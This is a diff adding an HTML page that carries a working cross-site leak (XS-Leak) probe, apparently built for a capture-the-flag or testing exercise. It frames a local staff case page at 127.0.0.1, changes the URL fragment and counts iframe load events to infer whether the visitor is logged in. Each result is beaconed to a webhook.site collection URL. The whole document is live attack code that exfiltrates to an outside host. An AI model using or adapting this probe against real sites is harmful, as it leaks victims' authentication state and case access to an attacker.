@@ -1,0 +1,26 @@
+<!doctype html><html><head><title>p11</title></head><body>p11
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+var C="https://127.0.0.1:8443/staff/cases/BT-017";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,400));}catch(e){}}
+var loads=0;
+b("start11","1");
+var f=document.createElement("iframe");
+f.onload=function(){ loads++; b("load_"+loads, String(Date.now())); };
+f.src=C;
+document.body.append(f);
+setTimeout(function(){
+  b("phase1_loads","after-initial="+loads);
+  var base=loads;
+  f.src=C+"#frag1";
+  setTimeout(function(){
+    b("frag_same_doc","extra_loads="+(loads-base)+" (0 means authenticated case page)");
+    var base2=loads;
+    f.src=C+"#frag2";
+    setTimeout(function(){
+      b("frag2","extra_loads="+(loads-base2)+" (0 means on case page now)");
+      b("total","loads="+loads);
+    },2500);
+  },2500);
+},3000);
+</script></body></html>
